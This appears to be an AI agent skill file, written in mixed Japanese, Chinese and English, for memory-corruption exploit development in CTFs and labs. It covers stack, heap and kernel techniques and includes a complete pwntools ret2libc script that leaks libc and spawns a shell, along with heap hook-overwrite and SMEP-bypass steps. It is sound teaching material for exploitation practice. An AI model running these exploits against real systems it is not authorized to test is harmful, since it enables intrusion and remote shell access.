---
name: pwn-chain
description: "スタック/ヒープ/カーネルのエクスプロイト開発。Triggers: pwn, ROP, heap overflow, stack overflow, exploit development, pwntools, CTF pwn, kernel pwn."
---

# pwn-chain — 脆弱点→working exploit

## ACTION REQUIRED
1. 授权確認: ../field-journal/precedent-auth.md
2. tool-index確認: ../references/tool-index.md
3. ACT: 工作流第1步を実行

## 適用範囲
- バイナリCTF / lab / owned target
- stack pwn: BOF, ROP, ret2libc, stack canary bypass, SROP
- heap pwn: tcache poisoning, fastbin dup, unsorted bin attack, UAF, double free, house of X
- kernel pwn: ret2usr, kernel ROP, SMEP/SMAP bypass, CVE driver exploitation

## 工具依存

| tool | required | purpose | auto_install |
|------|----------|---------|--------------|
| pwntools | yes | exploit skeleton + IO | `pip install pwntools` |
| GEF / pwndbg | yes | gdb enhanced debugging | curl or git |
| ROPgadget | yes | gadget search | `pip install ropgadget` |
| one_gadget | recommended | libc execve gadget | `gem install one_gadget` |
| libc-database | recommended | libc symbol lookup | git clone |

## 工作流

1. **recon**: `checksec --file=./target` / `pwn checksec target` → NX/PIE/Canary/RELRO/ASLR
2. **vuln identify**: ソースが無い場合は `r2 -A target` または IDA/Ghidra で `main` → 入力処理を追跡。長さチェックの有無を確認。
3. **exploit skeleton**: `pwn template --host HOST --port PORT ./target > exploit.py`。local test時は `process('./target')`。
4. **stack pwn**:
   - pattern: `cyclic(128)` で crash offset 特定、`cyclic_find(0x41414141)`
   - ROP: `ROPgadget --binary target --ropchain`; pwntools `ROP(target)`
   - ret2libc: leak libc address → `libc.address = leak - libc.symbols.puts`; then `libc.search(b'/bin/sh')`
   - canary: byte-by-byte brute force または format-string leak による上書き
5. **heap pwn**:
   - `heap chunks`, `heap bins` (pwndbg) でレイアウト把握
   - UAF/double free で `tcache_perthread_struct` 偽造 or fastbin dup
   - unsorted bin attack で libc leak → `__free_hook` / `__malloc_hook` overwrite
6. **kernel pwn**:
   - `modinfo target.ko` / `cat /proc/modules` でバージョン把握
   - ret2usr 用に userland shellcode を mmap、SMEP bypass は `mov cr4, ...` ROP
   - `ioctl` 経由で脆弱 trigger、kernel debugger (qemu+gdb) で追跡
7. **shell**: `io.interactive()`。remote なら `remote('host', port)`。get flag → `cat flag`

## 具体コマンド例

```python
from pwn import *
context.arch = 'amd64'
elf = ELF('./target')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
io = process('./target')
# io = remote('host', port)

offset = cyclic_find(0x61616171)
rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])
io.sendlineafter(b':', flat({offset: rop.chain()}))
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

binsh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
ret = rop.find_gadget(['ret'])[0]
io.sendlineafter(b':', flat({offset: [ret, system, binsh]}))
io.interactive()
```

libc-database:
```bash
cd /opt/libc-database
./add ubuntu 20.04 libc.so.6
./find puts 6f0
```

## ヒープtips
- `pwndbg> arena` / `pwndbg> tcachebins` / `pwndbg> fastbins`
- `pwndbg> heapinfo` で chunk 一覧
- unsorted bin から libc leak 後は `__free_hook` 経由で `system("/bin/sh")`

## 按需自举

欠ツール時は `../scripts/bootstrap.sh` (Linux/macOS) または `../scripts/bootstrap.ps1` (Windows) を実行。インストール後は `../scripts/refresh-tool-index.sh` で index 更新。

## 路由上下文

- 上游: reverse-skill router / CTF orchestrator
- 下游: reverse-engineering（難読化バイナリ）, malware-analysis（malicious binary）
- 同級: patch-diff-exploit（N-day diff）, pentest-tools（network pentest）

## 任務完了自検

- [ ] 対象が authorized target（CTF/lab/owned/書面授权）であることを明記
- [ ] `checksec`/保護機構と ASLR 状態を記録
- [ ] exploit.py が reproducible に動作し、shell/flag 取得を確認
- [ ] 発見（gadget, leak, libc version）を `../field-journal/` に anonymize 記録
